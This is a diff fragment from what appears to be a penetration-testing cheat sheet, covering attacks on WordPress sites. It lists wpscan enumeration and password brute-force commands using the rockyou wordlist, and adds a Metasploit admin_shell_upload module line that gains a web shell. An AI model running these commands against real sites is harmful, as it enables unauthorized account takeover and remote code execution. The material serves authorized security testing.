@@ -1033,6 +1033,7 @@ $ curl -s <URL> | grep plugins
 $ sudo wpscan --url <URL> -e u,ap,at,cb,dbe
 $ sudo wpscan --password-attack xmlrpc -t 20 -U admin -P /usr/share/wordlists/rockyou.txt --url <URL>
 $ sudo wpscan --password-attack wp-login -t 20 -U admin -P /usr/share/wordlists/rockyou.txt --url <URL>
+use exploit/unix/webapp/wp/admin_shell_upload
 ```
 
 - Joomla
